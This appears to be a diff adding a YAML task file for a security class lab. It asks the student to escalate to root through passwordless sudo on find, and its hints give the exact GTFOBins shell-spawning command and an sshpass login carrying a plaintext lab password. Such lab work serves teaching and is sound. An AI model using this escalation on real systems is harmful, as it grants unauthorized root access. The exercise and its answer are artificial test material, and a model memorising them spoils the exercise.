@@ -1,0 +1,19 @@
+id: "04"
+title: "Escalate via passwordless sudo"
+prompt: |
+  Second vector: intern can run /usr/bin/find with passwordless sudo.
+
+  From the intern shell:
+
+    sudo find . -exec /bin/sh \;
+    (spawns a root shell)
+
+  Prove it: whoami → ~/kali-class-work/sec-wk10/privesc-sudo.txt
+  Stamp: kali-class stamp sec-wk10 privesc-sudo
+hints:
+  - "sudo find . -exec /bin/sh \\; — GTFOBins find entry, passwordless for intern."
+  - "Capture: sshpass -p intern123 ssh -p 2222 intern@127.0.0.1 \"sudo find /tmp -exec whoami \\\\;\" > ~/kali-class-work/sec-wk10/privesc-sudo.txt"
+verify:
+  script: "04-privesc-sudo.verify.sh"
+  timeout: 60
+on_success: "Passwordless sudo find → root. Misconfigured sudoers strikes again."
